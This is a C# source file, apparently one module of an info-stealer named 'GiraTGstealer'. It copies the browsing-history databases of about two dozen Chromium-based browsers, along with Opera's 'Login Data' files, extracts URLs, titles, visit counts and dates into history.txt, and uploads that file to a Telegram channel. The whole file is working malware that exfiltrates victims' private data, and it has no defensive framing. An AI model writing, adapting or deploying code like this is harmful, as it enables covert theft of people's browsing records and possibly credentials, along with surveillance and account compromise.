using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace GiraTGstealer.stealer
{
    internal class History
    {
        public static void start()
        {
            AutoStealer.loadDlls();

            string ad = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string ud = "\\User Data\\Default\\History";

            string[] chromBrowsers = new string[]
            {
                lad + "Google\\Chrome" + ud,
                lad + "Google(x86)\\Chrome" + ud,
                lad + "Chromium" + ud,
                ad + "Opera Software\\Opera Stable\\Login Data",
                ad + "Opera Software\\Opera GX Stable\\Login Data",
                lad + "BraveSoftware\\Brave-Browser" + ud,
                lad + "Epic Privacy Browser" + ud,
                lad + "Amigo" + ud,
                lad + "Vivaldi" + ud,
                lad + "Orbitum" + ud,
                lad + "Mail.ru\\Atom" + ud,
                lad + "Kometa" + ud,
                lad + "Comodo\\Dragon" + ud,
                lad + "Torch" + ud,
                lad + "Comodo" + ud,
                lad + "Slimjet" + ud,
                lad + "360Browser\\Browser" + ud,
                lad + "Maxthon3" + ud,
                lad + "K-Melon" + ud,
                lad + "Sputnik\\Sputnik" + ud,
                lad + "Nichrome" + ud,
                lad + "CocCoc\\Browser" + ud,
                lad + "uCozMedia\\Uran" + ud,
                lad + "Chromodo" + ud,
                lad + "Yandex\\YandexBrowser" + ud
            };

            string tHL = "";
            string filename = "history.txt";
            string output = "[HISTORY]\n\n";

            foreach(string browser in chromBrowsers)
            {
                if(File.Exists(browser))
                {
                    tHL = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
                    if(File.Exists(tHL)) 
                    {
                        File.Delete(tHL);
                    }
                    File.Copy(browser, tHL);
                }
                else
                {
                    continue;
                }
                SQLite sQLite = new SQLite(tHL);
                sQLite.ReadTable("urls");
                for(int i = 0; i < sQLite.GetRowCount(); i++) 
                {
                    string url = Convert.ToString(sQLite.GetValue(i, 1));
                    string title = Convert.ToString(sQLite.GetValue(i, 2));
                    string visits = Convert.ToString(Convert.ToInt32(sQLite.GetValue(i, 3)) + 1);
                    string time = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sQLite.GetValue(1, 5))), TimeZoneInfo.Local));

                    if(string.IsNullOrEmpty(url))
                    {
                        break;
                    }

                    output += "URL: " + url + "\n"
                        + "TITLE: " + Crypt.toUTF8(title) + "\n"
                        + "VISITS: " + visits + "\n"
                        + "DATE: " + time + "\n"
                        + "\n";
                    continue;

                }
                continue;
            }
            File.WriteAllText(filename, output);
            telegram.UploadFile(filename, true);
        }
    }
}
